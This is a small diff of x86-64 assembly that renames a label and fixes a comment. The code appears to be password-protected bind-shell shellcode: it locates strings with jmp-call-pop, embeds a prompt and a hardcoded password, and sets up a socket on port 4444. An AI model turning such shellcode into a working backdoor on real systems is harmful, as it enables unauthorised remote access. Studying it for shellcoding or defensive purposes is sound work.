@@ -3,13 +3,13 @@ section .text
 
 _start:
 	mov rbp, rsp
-	jmp short _data	  	; Find address of string list
+	jmp short _strdata 	; Find address of string list
 
 _getref:	; Keep reference to strings
 	pop r15
 	jmp _main
 
-_data:
+_strdata:
 	call _getref		; call pushes RIP onto stack
 	prompt: db "Speak friend and enter: "
 	pass:	db "password"
@@ -39,7 +39,7 @@ _prompt:	; send string to a socket, RDI and RCX populated before call
 
 _main:
 
-; Build a server sockaddr_struct on the stack
+; Build a server sockaddr_in struct on the stack
 	xor rax, rax
 	push rax
 	add ax, 0x5c11
